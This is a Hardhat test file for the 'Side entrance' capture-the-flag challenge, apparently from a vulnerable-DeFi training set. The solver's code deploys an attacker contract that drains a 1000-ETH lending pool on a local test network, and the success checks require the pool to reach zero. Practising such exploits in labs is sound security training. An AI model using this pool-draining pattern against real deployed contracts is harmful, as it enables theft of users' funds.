const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Side entrance', function () {

    let deployer, attacker;

    const ETHER_IN_POOL = ethers.utils.parseEther('1000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const SideEntranceLenderPoolFactory = await ethers.getContractFactory('SideEntranceLenderPool', deployer);
        this.pool = await SideEntranceLenderPoolFactory.deploy();
        
        await this.pool.deposit({ value: ETHER_IN_POOL });

        this.attackerInitialEthBalance = await ethers.provider.getBalance(attacker.address);

        expect(
            await ethers.provider.getBalance(this.pool.address)
        ).to.equal(ETHER_IN_POOL);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        // await this.pool.connect(attacker).deposit(1);
        // await this.pool.connect(attacker).flashLoan();
        // this.pool.address
        const AttackerFactory = await ethers.getContractFactory(
            'SideEntranceLenderPoolAttacker', 
            deployer
        );
        // const AttackerFactory = await ethers.getContractFactory('TrusterLenderPoolAttacker', attacker);

        const attackerCntr = await AttackerFactory.deploy(this.pool.address);
        console.log('attackerCntr', attackerCntr.functions);
        await attackerCntr.connect(attacker).attack1(ETHER_IN_POOL, attacker.address);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(
            await ethers.provider.getBalance(this.pool.address)
        ).to.be.equal('0');
        
        // Not checking exactly how much is the final balance of the attacker,
        // because it'll depend on how much gas the attacker spends in the attack
        // If there were no gas costs, it would be balance before attack + ETHER_IN_POOL
        console.log('attacker balance', await ethers.provider.getBalance(attacker.address))
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt(this.attackerInitialEthBalance);
    });
});
